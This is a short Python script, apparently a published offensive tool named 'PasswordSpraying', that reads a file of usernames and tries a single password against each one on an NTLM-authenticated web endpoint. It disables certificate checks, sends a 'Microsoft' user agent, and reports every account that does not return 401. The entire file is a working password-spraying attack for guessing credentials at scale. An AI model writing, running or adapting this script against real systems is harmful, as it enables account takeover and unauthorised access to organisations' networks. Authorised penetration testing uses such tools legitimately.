import sys
import base64
import requests
from requests_ntlm import HttpNtlmAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning

VERSION = "1.1"

def send_request(username, password, url, domain):
    if domain == "":
        username = "{}".format(username)
    else:
        username = "{}\\{}".format(domain, username)

    print("Trying user {}".format(username))
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.get(url, auth=HttpNtlmAuth(username, password), headers={'User-Agent': 'Microsoft'}, verify=False)
        if not req.status_code == 401:
            print("User {} password is {}".format(username, password))
    except Exception as e:
        print(e)

if __name__ == "__main__":
    print("PasswordSpraying v{}\nWith Love c0d3cr4f73r \n-----------------------------------\n\n".format(VERSION))
    if len(sys.argv) < 5:
        print("Usage: {} [user list] [domain] [url] [password]".format(sys.argv[0]))
        sys.exit(0)

    domain = sys.argv[2]
    url = sys.argv[3]
    password = sys.argv[4]
    print("Spraying password {} against {} using domain {}".format(password, url, domain))
    with open(sys.argv[1], "rb") as f:
        for email in f.readlines():
            send_request(email.strip().decode("utf-8"), password, url, domain)
